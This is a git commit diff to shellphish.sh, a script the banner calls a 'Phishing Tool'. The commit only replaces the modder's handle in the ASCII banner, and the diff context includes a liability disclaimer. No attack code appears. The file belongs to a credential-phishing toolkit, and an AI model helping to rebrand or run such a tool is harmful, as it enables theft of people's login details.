ae428238c0bc3575d93f8c9bd8e6c775c311d1ac
kunjpatel94 <55629838+kunjpatel94@users.noreply.github.com>
2021-01-18 19:09:33 +0530

    Update shellphish.sh
    Just learning

--- shellphish.sh
+++ shellphish.sh
@@ -77,7 +77,7 @@ printf "\e[1;91m      \ \ | |_  | / _  )| || ||  ____/ | |_  || | /___)| |_  | \
 printf "\e[1;92m  _____) )| | | |( (/ / | || || |      | | | || ||___ || | | | \e[0m\n"
 printf "\e[1;92m (______/ |_| |_| \____)|_||_||_|      |_| |_||_|(___/ |_| |_| \e[0m\n"
 printf "\n"
-printf "\e[1;93m       .:.:.\e[0m\e[1;94m Phishing Tool Moded by @AbirHasan2005 \e[0m\e[1;93m.:.:.\e[0m\n\n"
+printf "\e[1;93m       .:.:.\e[0m\e[1;94m Phishing Tool Moded by @Kunj2005 \e[0m\e[1;93m.:.:.\e[0m\n\n"
 printf "  \e[101m\e[1;77m:: Disclaimer: Developers assume no liability and are not    ::\e[0m\n"
 printf "  \e[101m\e[1;77m:: responsible for any misuse or damage caused by ShellPhish ::\e[0m\n"
 printf " \n"
